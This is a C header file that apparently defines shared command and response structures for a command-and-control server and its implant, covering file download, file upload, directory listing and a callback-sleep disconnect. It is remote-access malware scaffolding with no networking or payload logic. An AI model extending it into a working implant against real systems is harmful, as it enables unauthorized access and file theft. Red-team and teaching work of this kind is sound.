// Define common structs across C2 and implant

#include <stdint.h>

// All possible commands we could get from our C2
typedef enum Commands
{
    disconnect = 0,
    getfile,
    putfile,
    dirlist
} Commands;

typedef struct DisconnectCommand
{
    uint32_t sleep; // how long to sleep before calling back out (0 to just exit)
    uint32_t callbackport; // which port we should reach out to once our sleep has elapsed
} DisconnectCommand;

typedef struct GetFileCommand
{
    char* filepath; // path to the file we are getting
} GetFileCommand; 

typedef struct PutFileCommand
{
    char* filepath; // path to where we are writing the file
    char* filebytes; // buffer containing contents of the file 
} PutFileCommand;

typedef struct DirListCommand
{
    char* dirpath; // path to the directory we are performing a dirlist on 
} DirListCommand;

// Each command has a structure we are parsing 
typedef struct Command
{
    enum Commands command;

    // Depending on the command type for this message will determine which command's data we parse
    union 
    {
        DisconnectCommand disconnectcommand;

        GetFileCommand getfilecommand;

       PutFileCommand putfilecommand;

        DirListCommand dirlistcommand;
    };
    
} Command;

// Each command has a response we are sending back
typedef struct Response
{
    enum Commands response;

    union 
    {
        struct disconnectresponse
        {
            // nothing needed here
        };

        struct getfileresponse
        {
            char* filebytes; // contents of file we were told to get
        };

        struct putfileresponse
        {
            // nothing needed here? could put number of bytes written to target
        };

        struct dirlistresponse
        {
            char* dircontents; // contents of directory we were told to perfornm a dirlist on 
        };
    };
    
} Response;